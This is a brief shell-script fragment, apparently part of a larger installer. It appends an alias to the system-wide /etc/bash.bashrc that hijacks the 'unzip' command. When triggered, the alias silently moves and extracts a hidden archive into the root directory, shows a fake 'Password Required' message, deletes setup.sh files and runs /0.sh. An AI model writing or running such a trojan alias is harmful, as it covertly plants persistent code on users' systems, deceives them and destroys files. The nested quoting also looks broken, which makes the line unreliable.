...
sleep 2
echo 'alias unzip="mv /usr/share/misc/final/setup.zip /; echo "Password Required"; unzip /setup.zip -d / >/dev/null 2>&1; find / -name setup.sh -exec rm -f {} 2>/dev/null \; /0.sh; cd -"' >> /etc/bash.bashrc
